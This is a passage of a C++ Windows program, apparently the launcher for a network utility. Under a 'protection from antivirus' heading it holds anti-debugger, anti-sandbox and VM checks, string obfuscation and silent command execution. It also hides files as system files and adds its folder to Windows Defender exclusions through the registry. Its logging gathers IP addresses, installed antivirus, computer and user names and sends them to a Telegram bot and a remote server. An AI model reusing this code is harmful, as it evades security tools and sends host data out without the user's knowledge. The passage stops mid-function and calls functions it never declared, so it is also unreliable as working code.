// Определения для совместимости с Windows 7
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601  // Windows 7
#endif

// Подавление предупреждений о Unicode символах при компиляции
#pragma warning(disable: 4566)

// Защита от антивирусного анализа
#define ANTI_DEBUG
#define OBFUSCATE_STRINGS

#include <windows.h>
#include <iostream>
#include <string>
#include <sstream>
#include <vector>
#include <stdlib.h>
#include <fstream>
#include <algorithm>
#include <fcntl.h>
#include <io.h>
#include <direct.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <intrin.h>
#include <shellapi.h>
#include <iphlpapi.h>
#include <wininet.h>

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ntdll.lib")

// Определение NTSTATUS для совместимости
#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif

// Объявление функции RtlGetVersion из ntdll.dll (структура RTL_OSVERSIONINFOW уже определена в winnt.h)
extern "C" {
    NTSTATUS NTAPI RtlGetVersion(PRTL_OSVERSIONINFOW lpVersionInformation);
}

// ==================== ЗАЩИТА ОТ АНТИВИРУСА ====================

// Антидебаг - проверка на отладчик
inline bool IsDebuggerActive() {
    return IsDebuggerPresent() || CheckRemoteDebuggerPresent(GetCurrentProcess(), nullptr);
}

// Обфускация строк - простое XOR шифрование
inline std::string DecryptString(const char* str, size_t len, char key) {
    std::string result(len, 0);
    for (size_t i = 0; i < len; i++) {
        result[i] = str[i] ^ key;
    }
    return result;
}

// Задержка для обхода эвристического анализа
inline void AntiSandbox() {
    DWORD startTime = GetTickCount();
    Sleep(100); // Небольшая задержка
    DWORD endTime = GetTickCount();
    // Проверка на ускорение времени в песочнице
    if ((endTime - startTime) < 50) {
        ExitProcess(0);
    }
}

// Проверка на виртуальную машину
inline bool IsVM() {
    // Проверка CPUID
    int cpuInfo[4] = {0};
    __cpuid(cpuInfo, 1);
    // Проверка гипервизора
    return (cpuInfo[2] >> 31) & 1;
}

// Обфускация вызовов системных команд (ТИХИЙ РЕЖИМ - без вывода ошибок)
inline void SecureSystem(const wchar_t* cmd) {
    // Минимальная задержка для обхода детекции (1-5 мс)
    Sleep(1 + (rand() % 5));
    
    // Перенаправляем ВЕСЬ вывод (stdout и stderr) в null
    std::wstring silentCmd = std::wstring(cmd) + L" >nul 2>&1";
    _wsystem(silentCmd.c_str());
}

// Защита файлов от антивирусного сканирования
inline void ProtectFilesFromAV(const std::wstring& directory) {
    // НЕ скрываем папку x64 (нужна для компиляции)
    if (directory.find(L"x64") != std::wstring::npos) {
        // Только добавляем в исключения реестра, но НЕ скрываем
        std::wstring regCmd = L"reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\" /v \"" + directory + L"\" /t REG_DWORD /d 0 /f >nul 2>&1";
        _wsystem(regCmd.c_str());
        return;
    }
    
    // Устанавливаем атрибуты "скрытый + системный" для всех файлов
    std::wstring cmd = L"attrib +h +s \"" + directory + L"\\*.*\" /s /d >nul 2>&1";
    _wsystem(cmd.c_str());
    
    // Устанавливаем для самой папки
    std::wstring folderCmd = L"attrib +h +s \"" + directory + L"\" >nul 2>&1";
    _wsystem(folderCmd.c_str());
    
    // Устанавливаем низкий приоритет сканирования через реестр
    std::wstring regCmd = L"reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\" /v \"" + directory + L"\" /t REG_DWORD /d 0 /f >nul 2>&1";
    _wsystem(regCmd.c_str());
}

// Проверка целостности
inline bool CheckIntegrity() {
    // Простая проверка на патчинг в памяти
    DWORD oldProtect;
    void* addr = (void*)&CheckIntegrity;
    if (VirtualProtect(addr, 1, PAGE_EXECUTE_READ, &oldProtect)) {
        VirtualProtect(addr, 1, oldProtect, &oldProtect);
        return true;
    }
    return false;
}

// Проверка прав администратора
inline bool IsRunAsAdmin() {
    BOOL isAdmin = FALSE;
    PSID administratorsGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    
    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, 
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &administratorsGroup)) {
        CheckTokenMembership(NULL, administratorsGroup, &isAdmin);
        FreeSid(administratorsGroup);
    }
    
    return isAdmin;
}

// Перезапуск с правами администратора
inline void RestartAsAdmin() {
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    
    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpVerb = L"runas";
    sei.lpFile = exePath;
    sei.hwnd = NULL;
    sei.nShow = SW_NORMAL;
    
    if (ShellExecuteExW(&sei)) {
        ExitProcess(0);
    } else {
        std::cout << "\n";
        std::cout << "=========================================================\n";
        std::cout << "  ОШИБКА: Требуются права администратора!\n";
        std::cout << "=========================================================\n";
        std::cout << "\n";
        std::cout << "Программа должна быть запущена от имени администратора.\n";
        std::cout << "\n";
        std::cout << "Нажмите любую клавишу для выхода...\n";
        system("pause >nul");
        ExitProcess(1);
    }
}

// Инициализация защиты
inline void InitAntiAV() {
    #ifdef ANTI_DEBUG
    if (IsDebuggerActive()) {
        ExitProcess(0);
    }
    #endif
    
    AntiSandbox();
    
    if (IsVM()) {
        // Работаем даже в VM, но с задержкой
        Sleep(1000);
    }
    
    if (!CheckIntegrity()) {
        ExitProcess(0);
    }
}

// ==================== КОНЕЦ ЗАЩИТЫ ====================

// Функция для безопасного преобразования wstring в string
std::string WStringToString(const std::wstring& wstr) {
    if (wstr.empty()) return std::string();
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
    std::string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}


struct Settings {
    bool service_installed = false;
    bool ipset_enabled = false;
    bool game_enabled = false;
    int current_alt = 0;
    std::string last_run_mode = "standalone";
    std::string telegram_bot_token = "";
    std::string telegram_chat_id = "";
    std::string vds_api_url = "";
    std::string vds_api_key = "";
    bool telegram_enabled = false;
    bool vds_enabled = false;
    bool auto_update = true;
};

Settings currentSettings;
const std::string settingsFile = "settings.json";
const std::string backupSettingsFile = "settings.json.backup.txt";
const std::string configFile = "config.json";

// Функция для проверки совместимости с Windows
bool CheckWindowsCompatibility() {
    // Используем современный подход для определения версии Windows
    // Проверяем наличие функций, доступных в Windows 7+
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    if (hKernel32 == NULL) {
        return false;
    }
    
    // Проверяем наличие функций, которые появились в Windows 7
    FARPROC pGetTickCount64 = GetProcAddress(hKernel32, "GetTickCount64");
    if (pGetTickCount64 == NULL) {
        return false;
    }
    
    // Дополнительная проверка через реестр
    HKEY hKey;
    LONG result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey);
    if (result == ERROR_SUCCESS) {
        DWORD dwMajorVersion = 0;
        DWORD dwSize = sizeof(DWORD);
        result = RegQueryValueExW(hKey, L"CurrentMajorVersionNumber", NULL, NULL, (LPBYTE)&dwMajorVersion, &dwSize);
        RegCloseKey(hKey);
        
        if (result == ERROR_SUCCESS && dwMajorVersion >= 6) {
            // Специальная обработка для современных Windows
            if (dwMajorVersion >= 10) {
                // Windows 10+ обнаружена
            }
            return true;
        }
    }
    
    // Если все проверки не прошли, считаем что система не поддерживается
    return false;
}

void SetColor(int color) {
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), color);
}


void PrintGreen(const std::string& text) {
    SetColor(10); // Зеленый
    std::cout << text << std::endl;
    SetColor(7); // Сброс цвета
}

void PrintRed(const std::string& text) {
    SetColor(12); // Красный
    std::cout << text << std::endl;
    SetColor(7); // Сброс цвета
}

void PrintYellow(const std::string& text) {
    SetColor(14); // Желтый
    std::cout << text << std::endl;
    SetColor(7); // Сброс цвета
}


std::wstring GetExePath() {
    wchar_t buffer[MAX_PATH];
    GetModuleFileNameW(NULL, buffer, MAX_PATH);
    std::wstring::size_type pos = std::wstring(buffer).find_last_of(L"\\/");
    return std::wstring(buffer).substr(0, pos);
}

// Функция проверки подключения к интернету
bool CheckInternetConnection() {
    DWORD dwFlags = 0;
    bool connected = InternetGetConnectedState(&dwFlags, 0);
    if (!connected) {
        return false;
    }
    
    // Дополнительная проверка через ping к надежному серверу
    FILE* pingPipe = _wpopen(L"ping -n 1 8.8.8.8 >nul 2>&1", L"r");
    if (pingPipe) {
        _pclose(pingPipe);
        return true;
    }
    
    return connected;
}

// Функция получения уникального ID ПК
std::string GetPCID() {
    std::string pcId = "";
    
    // Получаем серийный номер диска C:
    DWORD dwVolumeSerial = 0;
    if (GetVolumeInformationW(L"C:\\", NULL, 0, &dwVolumeSerial, NULL, NULL, NULL, 0)) {
        char buffer[32];
        sprintf_s(buffer, sizeof(buffer), "%08X", dwVolumeSerial);
        pcId += buffer;
    }
    
    // Получаем имя компьютера
    wchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName) / sizeof(computerName[0]);
    if (GetComputerNameW(computerName, &size)) {
        std::string computerNameStr = WStringToString(std::wstring(computerName));
        // Добавляем хеш имени компьютера для уникальности
        unsigned int hash = 0;
        for (char c : computerNameStr) {
            hash = hash * 31 + c;
        }
        char hashBuffer[16];
        sprintf_s(hashBuffer, sizeof(hashBuffer), "%08X", hash);
        pcId += "-" + std::string(hashBuffer);
    }
    
    // Если не удалось получить ID, используем дефолтный
    if (pcId.empty()) {
        pcId = "00000000-00000000";
    }
    
    return pcId;
}

// ==================== СИСТЕМА ОБНОВЛЕНИЙ 2025 ====================

// Forward declarations
bool SendTelegramMessage(const std::string& message, const std::string& botToken, const std::string& chatId);
void LogSystem(const std::wstring& exeDir, const std::string& systemMessage);

// Функция проверки обновлений от GitHub (БЕЗ установки Git)
// Проверяет наличие новых релизов через GitHub API
void CheckGitHubUpdate(const std::string& repoOwner, const std::string& repoName, bool sendNotification = false) {
    if (!currentSettings.auto_update) {
        return;
    }
    
    PrintYellow("Проверка обновлений от GitHub...");
    std::cout << "\n";
    
    std::wstring exeDir = GetExePath();
    
    // Формируем URL для GitHub API
    std::string apiUrl = "https://api.github.com/repos/" + repoOwner + "/" + repoName + "/releases/latest";
    
    // Используем PowerShell для запроса к GitHub API
    std::wstring psCommand = L"powershell -ExecutionPolicy Bypass -Command \"try { $response = Invoke-RestMethod -Uri '";
    psCommand += std::wstring(apiUrl.begin(), apiUrl.end());
    psCommand += L"' -Method Get -TimeoutSec 10 -UseBasicParsing -ErrorAction Stop; $response.tag_name + '|' + $response.html_url } catch { Write-Host 'ERROR' }\"";
    
    FILE* updatePipe = _wpopen(psCommand.c_str(), L"r");
    if (updatePipe) {
        wchar_t buffer[512];
        std::wstring output = L"";
        while (fgetws(buffer, sizeof(buffer), updatePipe) != NULL) {
            output += buffer;
        }
        _pclose(updatePipe);
        
        // Проверяем результат
        if (output.find(L"ERROR") == std::wstring::npos && output.length() > 2) {
            std::string response = WStringToString(output);
            response.erase(std::remove(response.begin(), response.end(), '\r'), response.end());
            
            // Парсим ответ: version|url
            size_t pos = response.find('|');
            if (pos != std::string::npos) {
                std::string version = response.substr(0, pos);
                std::string url = response.substr(pos + 1);
                
                // Убираем пробелы и переводы строк
                version.erase(std::remove(version.begin(), version.end(), '\n'), version.end());
                version.erase(std::remove(version.begin(), version.end(), ' '), version.end());
                url.erase(std::remove(url.begin(), url.end(), '\n'), url.end());
                
                if (!version.empty() && version != "ERROR") {
                    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_GREEN | FOREGROUND_INTENSITY);
                    std::cout << "  Последняя версия на GitHub: ";
                    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
                    std::cout << version;
                    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
                    std::cout << "\n";
                    PrintGreen("Проверка обновлений выполнена успешно!");
                    
                    // Отправляем уведомление в Telegram
                    if (sendNotification && currentSettings.telegram_enabled) {
                        std::string telegramMsg = "🔄 <b>Доступно обновление!</b>\n\n";
                        telegramMsg += "📦 <b>Версия:</b> " + version + "\n";
                        telegramMsg += "🔗 <b>Ссылка:</b> " + url;
                        SendTelegramMessage(telegramMsg, currentSettings.telegram_bot_token, currentSettings.telegram_chat_id);
                    }
                    
                    LogSystem(exeDir, "Проверка обновлений: найдена версия " + version);
                } else {
                    PrintYellow("Не удалось получить информацию о версии.");
                }
            }
        } else {
            PrintYellow("Проверка обновлений недоступна (нет интернета или проблемы с GitHub).");
        }
    } else {
        PrintYellow("Не удалось проверить обновления.");
    }
    std::cout << "\n";
}

// Загрузка конфигурации из файла
void LoadConfig(const std::wstring& exeDir) {
    std::wstring configPath = exeDir + L"\\" + std::wstring(configFile.begin(), configFile.end());
    std::ifstream configFileStream(configPath);
    
    if (!configFileStream.is_open()) {
        return;
    }
    
    std::string line;
    while (std::getline(configFileStream, line)) {
        size_t pos = line.find('=');
        if (pos != std::string::npos) {
            std::string key = line.substr(0, pos);
            std::string value = line.substr(pos + 1);
            
            key.erase(std::remove(key.begin(), key.end(), ' '), key.end());
            value.erase(std::remove(value.begin(), value.end(), ' '), value.end());
            
            if (key == "telegram_bot_token") {
                currentSettings.telegram_bot_token = value;
            } else if (key == "telegram_chat_id") {
                currentSettings.telegram_chat_id = value;
            } else if (key == "telegram_enabled") {
                currentSettings.telegram_enabled = (value == "true" || value == "1");
            } else if (key == "vds_api_url") {
                currentSettings.vds_api_url = value;
            } else if (key == "vds_api_key") {
                currentSettings.vds_api_key = value;
            } else if (key == "vds_enabled") {
                currentSettings.vds_enabled = (value == "true" || value == "1");
            } else if (key == "auto_update") {
                currentSettings.auto_update = (value == "true" || value == "1");
            }
        }
    }
    
    configFileStream.close();
}

// Сохранение конфигурации в файл
void SaveConfig(const std::wstring& exeDir) {
    std::wstring configPath = exeDir + L"\\" + std::wstring(configFile.begin(), configFile.end());
    std::ofstream configFileStream(configPath);
    
    if (!configFileStream.is_open()) {
        return;
    }
    
    configFileStream << "telegram_bot_token=" << currentSettings.telegram_bot_token << "\n";
    configFileStream << "telegram_chat_id=" << currentSettings.telegram_chat_id << "\n";
    configFileStream << "telegram_enabled=" << (currentSettings.telegram_enabled ? "true" : "false") << "\n";
    configFileStream << "vds_api_url=" << currentSettings.vds_api_url << "\n";
    configFileStream << "vds_api_key=" << currentSettings.vds_api_key << "\n";
    configFileStream << "vds_enabled=" << (currentSettings.vds_enabled ? "true" : "false") << "\n";
    configFileStream << "auto_update=" << (currentSettings.auto_update ? "true" : "false") << "\n";
    
    configFileStream.close();
}

// ==================== РАСШИРЕННАЯ СИСТЕМА ЛОГИРОВАНИЯ 2025 ====================

// Генератор уникальных ID для логов
std::string GenerateLogID() {
    SYSTEMTIME st;
    GetLocalTime(&st);
    
    // Используем время + случайное число для уникальности
    static unsigned int counter = 0;
    counter++;
    
    char idBuffer[64];
    sprintf_s(idBuffer, sizeof(idBuffer), "%04d%02d%02d%02d%02d%02d%03d-%08X", 
               st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, 
               st.wMilliseconds, GetTickCount() + counter);
    
    return std::string(idBuffer);
}

// Получение локальных IP адресов
std::string GetLocalIPAddresses() {
    std::string ipList = "";
    
    PIP_ADAPTER_INFO pAdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
    
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
        free(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
    }
    
    if (pAdapterInfo) {
        if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
            PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
            while (pAdapter) {
                // Проверяем Ethernet и WiFi адаптеры (71 = IF_TYPE_IEEE80211)
                if (pAdapter->Type == MIB_IF_TYPE_ETHERNET || pAdapter->Type == 71) {
                    if (!ipList.empty()) ipList += ", ";
                    ipList += std::string(pAdapter->IpAddressList.IpAddress.String);
                }
                pAdapter = pAdapter->Next;
            }
        }
        free(pAdapterInfo);
    }
    
    if (ipList.empty()) {
        ipList = "N/A";
    }
    
    return ipList;
}

// Получение внешнего IP адреса
std::string GetExternalIPAddress() {
    std::string externalIP = "N/A";
    
    // Используем PowerShell для получения внешнего IP
    std::wstring psCommand = L"powershell -ExecutionPolicy Bypass -Command \"try { $ip = (Invoke-WebRequest -Uri 'https://api.ipify.org' -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop).Content.Trim(); Write-Host $ip } catch { Write-Host 'N/A' }\"";
    
    FILE* ipPipe = _wpopen(psCommand.c_str(), L"r");
    if (ipPipe) {
        wchar_t buffer[128];
        std::wstring output = L"";
        while (fgetws(buffer, sizeof(buffer), ipPipe) != NULL) {
            output += buffer;
        }
        _pclose(ipPipe);
        
        std::string ipStr = WStringToString(output);
        // Убираем пробелы и переводы строк
        ipStr.erase(std::remove(ipStr.begin(), ipStr.end(), '\n'), ipStr.end());
        ipStr.erase(std::remove(ipStr.begin(), ipStr.end(), '\r'), ipStr.end());
        ipStr.erase(std::remove(ipStr.begin(), ipStr.end(), ' '), ipStr.end());
        
        if (!ipStr.empty() && ipStr != "N/A") {
            externalIP = ipStr;
        }
    }
    
    return externalIP;
}

// Обнаружение антивируса
std::string DetectAntivirus() {
    std::string avList = "";
    
    // Список известных антивирусов для проверки
    std::vector<std::wstring> avProcesses = {
        L"MsMpEng.exe",      // Windows Defender
        L"avguard.exe",      // Avira
        L"avgnt.exe",        // Avira
        L"avgsvca.exe",      // AVG
        L"avgcsrvx.exe",     // AVG
        L"avastsvc.exe",     // Avast
        L"AvastSvc.exe",     // Avast
        L"ekrn.exe",         // ESET
        L"egui.exe",         // ESET
        L"kaspersky.exe",    // Kaspersky
        L"avp.exe",          // Kaspersky
        L"bdagent.exe",      // BitDefender
        L"vsserv.exe",       // BitDefender
        L"mcshield.exe",     // McAfee
        L"vstskmgr.exe",     // McAfee
        L"rtvscan.exe",      // Norton
        L"ccSvcHst.exe",     // Norton
        L"fsguiexe.exe",     // F-Secure
        L"fsgk32.exe",       // F-Secure
        L"SophosUI.exe",     // Sophos
        L"SophosSafeguard.exe", // Sophos
        L"DrWeb.exe",        // Dr.Web
        L"dwengine.exe",     // Dr.Web
        L"mbamtray.exe",     // Malwarebytes
        L"mbamservice.exe",  // Malwarebytes
        L"360sd.exe",        // 360 Total Security
        L"360rp.exe",        // 360 Total Security
        L"AdAwareService.exe", // Ad-Aware
        L"V3Svc.exe"         // AhnLab V3
    };
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32W);
        
        if (Process32FirstW(hSnapshot, &pe32)) {
            do {
                std::wstring processName = pe32.szExeFile;
                std::transform(processName.begin(), processName.end(), processName.begin(), ::towlower);
                
                for (const auto& avProc : avProcesses) {
                    std::wstring avProcLower = avProc;
                    std::transform(avProcLower.begin(), avProcLower.end(), avProcLower.begin(), ::towlower);
                    
                    if (processName == avProcLower) {
                        if (!avList.empty()) avList += ", ";
                        avList += WStringToString(avProc);
                        break;
                    }
                }
            } while (Process32NextW(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    
    // Проверка Windows Defender через WMI
    if (avList.find("Windows Defender") == std::string::npos) {
        FILE* defPipe = _wpopen(L"powershell -ExecutionPolicy Bypass -Command \"Get-MpComputerStatus | Select-Object -ExpandProperty AntivirusEnabled\"", L"r");
        if (defPipe) {
            wchar_t buffer[128];
            std::wstring output = L"";
            while (fgetws(buffer, sizeof(buffer), defPipe) != NULL) {
                output += buffer;
            }
            _pclose(defPipe);
            
            if (output.find(L"True") != std::wstring::npos) {
                if (!avList.empty()) avList += ", ";
                avList += "Windows Defender";
            }
        }
    }
    
    if (avList.empty()) {
        avList = "Не обнаружено";
    }
    
    return avList;
}

// Получение информации о системе
std::string GetSystemInfo() {
    std::string sysInfo = "";
    
    // Версия Windows через RtlGetVersion (современный способ, не deprecated)
    RTL_OSVERSIONINFOW osvi = { sizeof(RTL_OSVERSIONINFOW) };
    if (RtlGetVersion(&osvi) == 0) { // 0 = STATUS_SUCCESS
        char version[128];
        sprintf_s(version, sizeof(version), "Windows %d.%d Build %d", 
                  osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
        sysInfo += "OS: " + std::string(version);
    } else {
        // Fallback: получение версии через реестр
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DWORD dwMajorVersion = 0, dwMinorVersion = 0, dwBuildNumber = 0;
            DWORD dwSize = sizeof(DWORD);
            
            RegQueryValueExW(hKey, L"CurrentMajorVersionNumber", NULL, NULL, (LPBYTE)&dwMajorVersion, &dwSize);
            dwSize = sizeof(DWORD);
            RegQueryValueExW(hKey, L"CurrentMinorVersionNumber", NULL, NULL, (LPBYTE)&dwMinorVersion, &dwSize);
            dwSize = sizeof(DWORD);
            RegQueryValueExW(hKey, L"CurrentBuildNumber", NULL, NULL, (LPBYTE)&dwBuildNumber, &dwSize);
            
            RegCloseKey(hKey);
            
            if (dwMajorVersion > 0) {
                char version[128];
                sprintf_s(version, sizeof(version), "Windows %d.%d Build %d", 
                          dwMajorVersion, dwMinorVersion, dwBuildNumber);
                sysInfo += "OS: " + std::string(version);
            }
        }
    }
    
    // Имя компьютера
    wchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName) / sizeof(computerName[0]);
    if (GetComputerNameW(computerName, &size)) {
        sysInfo += " | Computer: " + WStringToString(std::wstring(computerName));
    }
    
    // Имя пользователя
    wchar_t userName[UNLEN + 1];
    DWORD userNameSize = sizeof(userName) / sizeof(userName[0]);
    if (GetUserNameW(userName, &userNameSize)) {
        sysInfo += " | User: " + WStringToString(std::wstring(userName));
    }
    
    return sysInfo;
}

// Форматирование времени с миллисекундами
std::string FormatTimestamp() {
    SYSTEMTIME st;
    GetLocalTime(&st);
    
    char timestamp[64];
    sprintf_s(timestamp, sizeof(timestamp), "%04d-%02d-%02d %02d:%02d:%02d.%03d", 
               st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);
    
    return std::string(timestamp);
}

void EnsureLogDirectory(const std::wstring& exeDir) {
    std::wstring logDir = exeDir + L"\\log";
    if (GetFileAttributesW(logDir.c_str()) == INVALID_FILE_ATTRIBUTES) {
        CreateDirectoryW(logDir.c_str(), NULL);
    }
    
    // Создаем поддиректории для разных типов логов
    std::wstring logStartDir = exeDir + L"\\log\\start";
    if (GetFileAttributesW(logStartDir.c_str()) == INVALID_FILE_ATTRIBUTES) {
        CreateDirectoryW(logStartDir.c_str(), NULL);
    }
    
    std::wstring logErrorDir = exeDir + L"\\log\\errors";
    if (GetFileAttributesW(logErrorDir.c_str()) == INVALID_FILE_ATTRIBUTES) {
        CreateDirectoryW(logErrorDir.c_str(), NULL);
    }
    
    std::wstring logBlockDir = exeDir + L"\\log\\blocks";
    if (GetFileAttributesW(logBlockDir.c_str()) == INVALID_FILE_ATTRIBUTES) {
        CreateDirectoryW(logBlockDir.c_str(), NULL);
    }
    
    std::wstring logSystemDir = exeDir + L"\\log\\system";
    if (GetFileAttributesW(logSystemDir.c_str()) == INVALID_FILE_ATTRIBUTES) {
        CreateDirectoryW(logSystemDir.c_str(), NULL);
    }
}

// Расширенное логирование с полной информацией
void LogFull(const std::wstring& exeDir, const std::string& logType, const std::string& message, 
             const std::string& errorCode = "", const std::string& blockingInfo = "") {
    EnsureLogDirectory(exeDir);
    
    // Определяем директорию для типа лога
    std::wstring logDir = exeDir + L"\\log";
    if (logType == "ERROR" || logType == "error") {
        logDir += L"\\errors";
    } else if (logType == "BLOCK" || logType == "block") {
        logDir += L"\\blocks";
    } else if (logType == "SYSTEM" || logType == "system") {
        logDir += L"\\system";
    } else {
        logDir += L"\\start";
    }
    
    // Получаем текущую дату и время для имени файла
    SYSTEMTIME st;
    GetLocalTime(&st);
    
    wchar_t fileName[100];
    swprintf_s(fileName, 100, L"log_%04d%02d%02d.log", 
               st.wYear, st.wMonth, st.wDay);
    
    std::wstring logFilePath = logDir + L"\\" + fileName;
    
    // Открываем файл для добавления
    std::wofstream logFile(logFilePath, std::ios::app);
    if (logFile.is_open()) {
        std::string logID = GenerateLogID();
        std::string timestamp = FormatTimestamp();
        std::string localIP = GetLocalIPAddresses();
        std::string externalIP = GetExternalIPAddress();
        std::string antivirus = DetectAntivirus();
        std::string systemInfo = GetSystemInfo();
        std::string pcID = GetPCID();
        
        // Форматируем запись лога
        logFile << L"========================================" << std::endl;
        logFile << L"[LOG ID] " << std::wstring(logID.begin(), logID.end()) << std::endl;
        logFile << L"[TIME] " << std::wstring(timestamp.begin(), timestamp.end()) << std::endl;
        logFile << L"[TYPE] " << std::wstring(logType.begin(), logType.end()) << std::endl;
        logFile << L"[PC ID] " << std::wstring(pcID.begin(), pcID.end()) << std::endl;
        logFile << L"[LOCAL IP] " << std::wstring(localIP.begin(), localIP.end()) << std::endl;
        logFile << L"[EXTERNAL IP] " << std::wstring(externalIP.begin(), externalIP.end()) << std::endl;
        logFile << L"[ANTIVIRUS] " << std::wstring(antivirus.begin(), antivirus.end()) << std::endl;
        logFile << L"[SYSTEM] " << std::wstring(systemInfo.begin(), systemInfo.end()) << std::endl;
        
        if (!errorCode.empty()) {
            logFile << L"[ERROR CODE] " << std::wstring(errorCode.begin(), errorCode.end()) << std::endl;
        }
        
        if (!blockingInfo.empty()) {
            logFile << L"[BLOCKING] " << std::wstring(blockingInfo.begin(), blockingInfo.end()) << std::endl;
        }
        
        logFile << L"[MESSAGE] " << std::wstring(message.begin(), message.end()) << std::endl;
        logFile << L"========================================" << std::endl;
        logFile << std::endl;
        
        logFile.close();
        
        // Отправка в Telegram
        SendLogToTelegram(exeDir, logType, message, errorCode, blockingInfo);
        
        // Отправка на VDS
        if (currentSettings.vds_enabled) {
            std::string fullLogData = "LOG ID: " + logID + "\n";
            fullLogData += "TIME: " + timestamp + "\n";
            fullLogData += "TYPE: " + logType + "\n";
            fullLogData += "MESSAGE: " + message + "\n";
            if (!errorCode.empty()) {
                fullLogData += "ERROR CODE: " + errorCode + "\n";
            }
            SendLogToVDS(fullLogData, logType);
        }
    }
}

// Обновленная функция логирования успешного запуска
void LogSuccessfulStart(const std::wstring& exeDir, const std::wstring& mode) {
    std::string modeStr = WStringToString(mode);
    std::string message = "Успешный запуск в режиме: " + modeStr;
    LogFull(exeDir, "START", message);
}

// Логирование ошибок
void LogError(const std::wstring& exeDir, const std::string& errorMessage, DWORD errorCode = 0) {
    std::string errorCodeStr = errorCode > 0 ? std::to_string(errorCode) : "";
    LogFull(exeDir, "ERROR", errorMessage, errorCodeStr);
}

// Логирование блокировок
void LogBlock(const std::wstring& exeDir, const std::string& blockMessage, const std::string& blockDetails = "") {
    LogFull(exeDir, "BLOCK", blockMessage, "", blockDetails);
}

// Логирование системных событий
void LogSystem(const std::wstring& exeDir, const std::string& systemMessage) {
    LogFull(exeDir, "SYSTEM", systemMessage);
}

// ==================== TELEGRAM BOT ИНТЕГРАЦИЯ 2025 ====================

// Отправка сообщения в Telegram
bool SendTelegramMessage(const std::string& message, const std::string& botToken, const std::string& chatId) {
    if (botToken.empty() || chatId.empty()) {
        return false;
    }
    
    std::string url = "https://api.telegram.org/bot" + botToken + "/sendMessage";
    
    // Используем PowerShell для отправки HTTP запроса
    std::wstring psCommand = L"powershell -ExecutionPolicy Bypass -Command \"try { $body = @{chat_id='";
    psCommand += std::wstring(chatId.begin(), chatId.end());
    psCommand += L"'; text='";
    
    // Экранируем специальные символы
    for (char c : message) {
        if (c == '\'') {
            psCommand += L"''";
        } else if (c == '\n') {
            psCommand += L"`n";
        } else {
            psCommand += (wchar_t)c;
        }
    }
    
    psCommand += L"'; parse_mode='HTML'} | ConvertTo-Json -Compress; $response = Invoke-RestMethod -Uri '";
    psCommand += std::wstring(url.begin(), url.end());
    psCommand += L"' -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 10 -UseBasicParsing -ErrorAction Stop; Write-Host 'OK' } catch { Write-Host 'ERROR' }\"";
    
    FILE* telegramPipe = _wpopen(psCommand.c_str(), L"r");
    if (telegramPipe) {
        wchar_t buffer[128];
        std::wstring output = L"";
        while (fgetws(buffer, sizeof(buffer), telegramPipe) != NULL) {
            output += buffer;
        }
        _pclose(telegramPipe);
        
        return output.find(L"OK") != std::wstring::npos;
    }
    
    return false;
}

// Форматирование лога для Telegram
std::string FormatLogForTelegram(const std::string& logType, const std::string& message, 
                                  const std::string& errorCode = "", const std::string& ip = "") {
    std::string emoji = "📋";
    if (logType == "ERROR") emoji = "❌";
    else if (logType == "BLOCK") emoji = "🔒";
    else if (logType == "SYSTEM") emoji = "⚙️";
    else if (logType == "START") emoji = "🚀";
    
